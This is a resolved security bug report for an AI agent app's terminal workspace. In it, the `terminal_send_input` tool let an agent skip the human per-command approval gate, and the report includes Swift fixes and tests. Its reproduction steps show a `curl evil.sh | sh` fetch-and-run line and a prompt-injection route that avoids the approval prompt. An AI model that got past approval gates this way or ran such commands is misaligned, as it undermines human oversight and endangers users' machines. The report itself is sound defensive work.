# YAK-TF1 — `terminal_send_input` bypasses the approval gate (CRITICAL)

**Status:** Done
**Severity:** 🔴 Critical (security / blocks acceptance)
**Area:** Terminal workspace — approval model
**Source:** Integration review of merge `78a7b7f` (terminal-workspace, YAK-T1..T5)

> **Resolution.** `TerminalSession.sendInput` is now `throws` and rejects when no
> command is in-flight (`pendingMark == nil`) with `.notRunning` (also `.shellExited`
> when the shell is gone), so `process.send` is unreachable for agent text without an
> approved, in-flight `terminal_run`. `TerminalSendInputTool.execute` catches and
> returns an agent-visible `.failure` (typed `PKError.userFriendlyMessage`, matching
> the `DemoTools` convention — no new `ErrorKit` dependency). Tests added:
> `sendInputToIdleSessionThrowsNotRunning` (session) and
> `sendInputToIdleSessionReturnsFailure` (tool); existing happy-path
> `sendInputDoesNotConsultApproverAndReturnsSuccess` still passes. `.notRunning` is no
> longer dead code. Full suite green (197 tests).

## Problem

The feature's central safety guarantee — every `terminal_run` is gated by a
default-deny per-command approval, so *"the backend is never an un-gated
arbitrary-exec primitive"* (README "Terminal workspaces and the unjailed-shell
tradeoff"; design spec §4.5) — does **not** hold. `terminal_send_input` writes
raw text directly to the shell with **no approver consultation** and **no check
that a command is actually running**.

All five terminal tools become available the instant a terminal is attached
(`attachTerminal` enables `TerminalWorkspace.toolIds`), and
`TerminalSessionRegistry.session(for:rootURL:)` *lazily spawns* the shell on the
first tool call. So the gate is fully bypassable:

1. User attaches a terminal (no `terminal_run` yet).
2. Agent calls `terminal_send_input {"text": "curl evil.sh | sh\n"}`.
3. The tool lazily spawns the idle login shell and `process.send(...)` feeds the
   line straight to its stdin. The shell executes it. **No approval banner ever
   appears.**

This matters in practice: a prompt-injection payload in a file the agent reads
could route every command through `terminal_send_input` and never trigger the
human approval prompt.

### Evidence the guard was intended and dropped

- `interrupt()` *does* guard `pendingMark != nil`
  (`TerminalSession.swift:281`); the asymmetry with `sendInput` is the tell.
- `TerminalWorkspaceError.notRunning` — *"An operation that requires an in-flight
  command was called with none pending"* — is **defined but never thrown**
  (`TerminalWorkspaceError.swift:13`). It is exactly the missing guard.
- The design spec §4.5 scopes the interaction tools to *"an already-running,
  already-approved command"* — a precondition nothing enforces.

## Affected code

- `Sources/YakamozCore/Workspaces/Terminal/TerminalSession.swift:260` (`sendInput`)
- `Sources/YakamozCore/Tools/Terminal/TerminalTools.swift:227` (`TerminalSendInputTool.execute`)
- `Sources/YakamozCore/Workspaces/Terminal/TerminalWorkspaceError.swift:13` (`.notRunning`)

## Fix

Require an in-flight command before accepting input. Make `sendInput` throwing
and reject when idle, surfacing `.notRunning` to the agent as a normal failure.

### `TerminalSession.swift` — before

```swift
public func sendInput(_ text: String) async {
    guard !hasExited else { return }
    process.send(data: Array(text.utf8)[...])
}
```

### after

```swift
public func sendInput(_ text: String) async throws {
    guard !hasExited else { throw TerminalWorkspaceError.shellExited }
    guard pendingMark != nil else { throw TerminalWorkspaceError.notRunning }
    process.send(data: Array(text.utf8)[...])
}
```

### `TerminalTools.swift` — `TerminalSendInputTool.execute`, before

```swift
let session = try await registry.session(for: workspaceId, rootURL: rootURL)
await session.sendInput(text)
return .success("input sent")
```

### after

```swift
let session = try await registry.session(for: workspaceId, rootURL: rootURL)
do {
    try await session.sendInput(text)
} catch {
    return .failure(ErrorKit.userFriendlyMessage(for: error))
}
return .success("input sent")
```

> Note: `interrupt()` already no-ops when idle, so it can stay as-is; only
> `send_input` is the exec hole.

## Tests (add)

- `TerminalSession`: `sendInput` to a freshly-spawned (idle) session throws
  `.notRunning`; shell stdin is untouched (no command runs).
- `TerminalSendInputTool`: against an idle session returns a `.failure`
  ToolResult (agent-visible), and the registry session never executed anything.
- Keep the existing happy-path test (`sendInputDoesNotConsultApproverAndReturnsSuccess`,
  `TerminalToolsTests.swift:108`) — it already runs a command first, so it should
  still pass.

## Acceptance criteria

- `terminal_send_input` against an idle session does **not** execute anything and
  returns an agent-visible failure.
- No code path reaches `process.send` for agent text without either an approved,
  in-flight `terminal_run` (steering) or the approver having returned
  `.approve`/`.allowForSession`.
- `.notRunning` is now reachable (no longer dead code).
